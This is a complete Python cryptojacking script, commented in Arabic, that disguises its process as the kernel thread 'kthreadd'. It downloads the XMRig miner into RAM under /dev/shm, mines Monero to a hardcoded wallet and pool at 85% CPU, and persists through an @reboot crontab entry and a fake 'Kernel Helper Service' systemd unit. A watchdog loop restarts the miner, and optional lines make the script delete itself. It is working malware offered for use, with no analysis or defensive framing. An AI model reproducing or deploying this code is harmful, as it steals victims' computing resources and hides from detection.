#!/usr/bin/env python3
import os
import sys
import subprocess
import urllib.request
import tarfile
import shutil
import time
import psutil
import getpass
import hashlib
import base64
from pathlib import Path

# ----------------- إخفاء اسم العملية فورًا (مهم جدًا) -----------------
try:
    import ctypes
    libc = ctypes.CDLL(None)
    libc.prctl(15, "kthreadd", 0, 0, 0)  # يظهر في ps باسم kthreadd (عملية كيرنل أصلية)
except:
    pass

# ----------------- الإعدادات الخفية -----------------
WALLET = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
POOL = "pool.supportxmr.com:5555"
XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
WORK_DIR = "/dev/shm/.cache"  # مكان في الرام، لا يترك أثر على القرص
XMRIG_PATH = f"{WORK_DIR}/xmrig"
USER = getpass.getuser()
HOST = os.uname().nodename
WORKER_NAME = f"PHANTOM-{HOST}-{USER}"

# ----------------- الانتقال للعمل من الذاكرة + تنظيف -----------------
os.makedirs(WORK_DIR, exist_ok=True)
os.chdir(WORK_DIR)

# حذف أي نسخة قديمة
if os.path.exists(XMRIG_PATH):
    try:
        os.chmod(XMRIG_PATH, 0o755)
    except:
        pass
else:
    # تحميل وفك ضغط XMRig في الرام فقط
    tar_path = f"{WORK_DIR}/x.tar.gz"
    try:
        urllib.request.urlretrieve(XMRIG_URL, tar_path, lambda *args: None)
        with tarfile.open(tar_path, "r:gz") as tar:
            for member in tar.getmembers():
                if member.name.endswith("xmrig") and "xmrig" in member.name:
                    f = tar.extractfile(member)
                    if f:
                        with open(XMRIG_PATH, "wb") as out:
                            out.write(f.read())
                        os.chmod(XMRIG_PATH, 0o755)
                        break
        os.remove(tar_path)
    except:
        sys.exit(0)

# ----------------- Persistence خفي جدًا (يعمل حتى بدون root) -----------------
script_path = os.path.abspath(__file__)
script_content = open(script_path, "rb").read()

# 1- crontab
cron_line = f"@reboot python3 {script_path}\n"
try:
    current_cron = subprocess.check_output("crontab -l", shell=True).decode(errors='ignore')
    if cron_line not in current_cron:
        subprocess.run('(crontab -l; echo "%s") | crontab -' % cron_line, shell=True)
except:
    pass

# 2- systemd user service
systemd_dir = Path.home() / ".config" / "systemd" / "user"
systemd_dir.mkdir(parents=True, exist_ok=True)
service_path = systemd_dir / "kworker.service"
service_content = f"""[Unit]
Description=Kernel Helper Service

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
service_path.write_text(service_content)
subprocess.run("systemctl --user daemon-reload && systemctl --user enable --now kworker.service", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ----------------- تشغيل XMRig بشكل خفي تمامًا -----------------
def run_miner():
    cmd = [
        XMRIG_PATH,
        "--donate-level=0",
        "--randomx-mode=light",
        "--cpu-max-threads-hint=85",
        "--background",
        "--tls",
        "--keepalive",
        "-o", POOL,
        "-u", WALLET,
        "-p", WORKER_NAME,
        "--no-color",
        "--variant", "-1"
    ]
    
    # إخفاء العملية بشكل إضافي
    subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True
    )

# تشغيل المُعدّن كل 30 ثانية إذا مات
while True:
    # التحقق إذا كان xmrig يعمل بالفعل
    running = False
    for proc in psutil.process_iter(['name', 'cmdline']):
        try:
            if 'xmrig' in proc.info['name'] or (proc.info['cmdline'] and 'xmrig' in ' '.join(proc.info['cmdline'])):
                running = True
                break
        except:
            continue
    
    if not running:
        run_miner()
    
    time.sleep(30)

# ----------------- حذف السكربت الأصلي بعد 15 ثانية (اختياري) -----------------
# إلغِ التعليق في السطرين التاليين إذا أردت أن يحذف نفسه تمامًا:
# time.sleep(15)
# os.remove(script_path)
